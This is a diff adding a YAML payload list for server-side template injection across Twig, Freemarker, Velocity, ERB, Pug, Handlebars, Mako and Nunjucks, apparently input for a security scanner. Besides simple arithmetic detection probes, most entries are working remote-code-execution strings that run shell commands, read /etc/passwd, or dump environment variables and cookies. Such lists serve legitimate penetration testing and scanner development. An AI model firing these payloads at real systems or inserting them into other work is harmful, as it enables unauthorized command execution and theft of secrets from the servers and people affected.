@@ -1,0 +1,360 @@
+metadata:
+  type: ssti/twig
+  version: "1.0"
+  description: "Twig, Freemarker, Velocity, ERB, Pug SSTI payloads"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings"]
+
+detection_patterns:
+  - "49"
+  - "(?i)error"
+  - "(?i)undefined"
+
+payloads:
+  twig:
+    - value: "{{7*7}}"
+      description: "Twig basic arithmetic"
+      severity: high
+      tags: [twig, detection]
+
+    - value: "{{7*'7'}}"
+      description: "Twig string multiplication"
+      severity: high
+      tags: [twig, detection]
+
+    - value: "{{_self}}"
+      description: "Twig _self object"
+      severity: high
+      tags: [twig, self]
+
+    - value: "{{_self.env}}"
+      description: "Twig environment"
+      severity: high
+      tags: [twig, env]
+
+    - value: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+      description: "Twig RCE via exec callback"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+      description: "Twig RCE via system callback"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}"
+      description: "Twig RCE via passthru"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('id')}}"
+      description: "Twig RCE via shell_exec"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}}"
+      description: "Twig file read"
+      severity: critical
+      tags: [twig, rce, file_read]
+
+    - value: "{{dump(app)}}"
+      description: "Twig dump app object"
+      severity: high
+      tags: [twig, dump]
+
+    - value: "{{dump(_context)}}"
+      description: "Twig dump context"
+      severity: high
+      tags: [twig, dump]
+
+    - value: "{{app.request.server.all}}"
+      description: "Twig server variables"
+      severity: high
+      tags: [twig, info]
+
+    - value: "{{app.request.headers.get('User-Agent')}}"
+      description: "Twig User-Agent"
+      severity: medium
+      tags: [twig, info]
+
+    - value: "{{app.request.cookies.all}}"
+      description: "Twig cookies"
+      severity: high
+      tags: [twig, info]
+
+    - value: "a]}}{%set a='id'%}{{a"
+      description: "Twig expression injection"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{['id']|filter('system')}}"
+      description: "Twig filter system"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{['cat /etc/passwd']|filter('system')}}"
+      description: "Twig filter file read"
+      severity: critical
+      tags: [twig, rce, file_read]
+
+    - value: "{{['id']|map('system')|join}}"
+      description: "Twig map system"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{['id']|reduce((a,b)=>a~b.system(b))}}"
+      description: "Twig reduce system"
+      severity: critical
+      tags: [twig, rce]
+
+    - value: "{{include('/etc/passwd')}}"
+      description: "Twig include file"
+      severity: critical
+      tags: [twig, file_read]
+
+    - value: "{{source('/etc/passwd')}}"
+      description: "Twig source file"
+      severity: critical
+      tags: [twig, file_read]
+
+  freemarker:
+    - value: "${7*7}"
+      description: "Freemarker arithmetic"
+      severity: high
+      tags: [freemarker, detection]
+
+    - value: "<#assign ex='freemarker.template.utility.Execute'>${ex('id')}</#assign>"
+      description: "Freemarker Execute RCE"
+      severity: critical
+      tags: [freemarker, rce]
+
+    - value: "<#assign ex='freemarker.template.utility.ObjectConstructor'>${ex('java.lang.ProcessBuilder','id').start()}</#assign>"
+      description: "Freemarker ProcessBuilder"
+      severity: critical
+      tags: [freemarker, rce]
+
+    - value: "<#assign ex='freemarker.template.utility.JythonRuntime'><@ex>import os;os.system('id')</@ex></#assign>"
+      description: "Freemarker Jython RCE"
+      severity: critical
+      tags: [freemarker, rce]
+
+    - value: "<#assign ex='freemarker.template.utility.Execute'>${ex('cat /etc/passwd')}</#assign>"
+      description: "Freemarker file read"
+      severity: critical
+      tags: [freemarker, rce, file_read]
+
+    - value: "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join}"
+      description: "Freemarker file read via class"
+      severity: critical
+      tags: [freemarker, file_read]
+
+    - value: "<#assign classLoader=product.getClass().getClassLoader()><#assign clazz=classLoader.loadClass('freemarker.template.utility.Execute')>${clazz.newInstance()('id')}</#assign>"
+      description: "Freemarker classloader RCE"
+      severity: critical
+      tags: [freemarker, rce]
+
+    - value: "${'freemarker.template.utility.Execute'?new()('id')}"
+      description: "Freemarker ?new() RCE"
+      severity: critical
+      tags: [freemarker, rce]
+
+  velocity:
+    - value: "#set($x=7*7)${x}"
+      description: "Velocity arithmetic"
+      severity: high
+      tags: [velocity, detection]
+
+    - value: "#set($rt=$x.getClass().forName('java.lang.Runtime'))#set($chr=$x.getClass().forName('java.lang.Character'))#set($str=$x.getClass().forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()$ex.getInputStream()"
+      description: "Velocity Runtime RCE"
+      severity: critical
+      tags: [velocity, rce]
+
+    - value: "#set($proc=$x.getClass().forName('java.lang.ProcessBuilder').newInstance('id').start())$proc.waitFor()"
+      description: "Velocity ProcessBuilder"
+      severity: critical
+      tags: [velocity, rce]
+
+    - value: "$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')"
+      description: "Velocity inline RCE"
+      severity: critical
+      tags: [velocity, rce]
+
+    - value: "#set($s=''){#set($c=$s.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))}$c"
+      description: "Velocity exec chain"
+      severity: critical
+      tags: [velocity, rce]
+
+    - value: "#set($e=$x.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd'))$e"
+      description: "Velocity file read"
+      severity: critical
+      tags: [velocity, rce, file_read]
+
+  erb:
+    - value: "<%= 7*7 %>"
+      description: "ERB arithmetic"
+      severity: high
+      tags: [erb, detection]
+
+    - value: "<%= system('id') %>"
+      description: "ERB system RCE"
+      severity: critical
+      tags: [erb, rce]
+
+    - value: "<%= `id` %>"
+      description: "ERB backtick RCE"
+      severity: critical
+      tags: [erb, rce]
+
+    - value: "<%= exec('id') %>"
+      description: "ERB exec RCE"
+      severity: critical
+      tags: [erb, rce]
+
+    - value: "<%= IO.popen('id').read %>"
+      description: "ERB IO.popen RCE"
+      severity: critical
+      tags: [erb, rce]
+
+    - value: "<%= system('cat /etc/passwd') %>"
+      description: "ERB file read"
+      severity: critical
+      tags: [erb, rce, file_read]
+
+    - value: "<%= `cat /etc/passwd` %>"
+      description: "ERB backtick file read"
+      severity: critical
+      tags: [erb, rce, file_read]
+
+    - value: "<%= File.read('/etc/passwd') %>"
+      description: "ERB File.read"
+      severity: critical
+      tags: [erb, file_read]
+
+    - value: "<%= request.env %>"
+      description: "ERB request env"
+      severity: high
+      tags: [erb, info]
+
+    - value: "<%= ENV.to_s %>"
+      description: "ERB environment"
+      severity: high
+      tags: [erb, info]
+
+  pug:
+    - value: "#{7*7}"
+      description: "Pug arithmetic"
+      severity: high
+      tags: [pug, detection]
+
+    - value: "#{global.process.mainModule.require('child_process').execSync('id')}"
+      description: "Pug Node.js RCE"
+      severity: critical
+      tags: [pug, rce]
+
+    - value: "#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd')}"
+      description: "Pug file read"
+      severity: critical
+      tags: [pug, rce, file_read]
+
+    - value: "#{JSON.stringify(global.process.env)}"
+      description: "Pug environment dump"
+      severity: high
+      tags: [pug, info]
+
+    - value: "#{global.process.mainModule.require('fs').readFileSync('/etc/passwd').toString()}"
+      description: "Pug fs read"
+      severity: critical
+      tags: [pug, file_read]
+
+    - value: "#{this.constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}"
+      description: "Pug constructor chain RCE"
+      severity: critical
+      tags: [pug, rce]
+
+    - value: "#{function(){try{return global.process.mainModule.require('child_process').execSync('id').toString()}catch(e){return e.message}}()}"
+      description: "Pug try-catch RCE"
+      severity: critical
+      tags: [pug, rce]
+
+  handlebars:
+    - value: "{{#with (lookup this 'constructor') as |c|}}{{#with (lookup c 'constructor') as |cc|}}{{cc 'return this.process.mainModule.require(\"child_process\").execSync(\"id\")'}}{{/with}}{{/with}}"
+      description: "Handlebars RCE"
+      severity: critical
+      tags: [handlebars, rce]
+
+    - value: "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}"
+      description: "Handlebars constructor RCE"
+      severity: critical
+      tags: [handlebars, rce]
+
+  mako:
+    - value: "<%! import os %>${os.popen('id').read()}"
+      description: "Mako RCE"
+      severity: critical
+      tags: [mako, rce]
+
+    - value: "${self.module.cache.util.os.popen('id').read()}"
+      description: "Mako self module RCE"
+      severity: critical
+      tags: [mako, rce]
+
+    - value: "<%! import os %>${os.popen('cat /etc/passwd').read()}"
+      description: "Mako file read"
+      severity: critical
+      tags: [mako, rce, file_read]
+
+  nunjucks:
+    - value: "{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}"
+      description: "Nunjucks RCE"
+      severity: critical
+      tags: [nunjucks, rce]
+
+    - value: "{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}"
+      description: "Nunjucks file read"
+      severity: critical
+      tags: [nunjucks, rce, file_read]
+
+  generic_polyglot:
+    - value: "{{7*7}}"
+      description: "Generic {{ }} detection"
+      severity: high
+      tags: [polyglot, detection]
+
+    - value: "${7*7}"
+      description: "Generic ${ } detection"
+      severity: high
+      tags: [polyglot, detection]
+
+    - value: "<%= 7*7 %>"
+      description: "Generic <% %> detection"
+      severity: high
+      tags: [polyglot, detection]
+
+    - value: "#{7*7}"
+      description: "Generic #{ } detection"
+      severity: high
+      tags: [polyglot, detection]
+
+    - value: "{{7*7}} ${7*7} <%= 7*7 %> #{7*7}"
+      description: "Multi-engine polyglot"
+      severity: high
+      tags: [polyglot, detection]
+
+    - value: "*{7*7}"
+      description: "Thymeleaf detection"
+      severity: high
+      tags: [polyglot, detection, thymeleaf]
+
+    - value: "__${7*7}__"
+      description: "Thymeleak detection"
+      severity: high
+      tags: [polyglot, detection, thymeleaf]
+
+    - value: "%#{7*7}"
+      description: "Ruby % detection"
+      severity: high
+      tags: [polyglot, detection]
+
+    - value: "{7*7}"
+      description: "Generic single brace"
+      severity: medium
+      tags: [polyglot, detection]
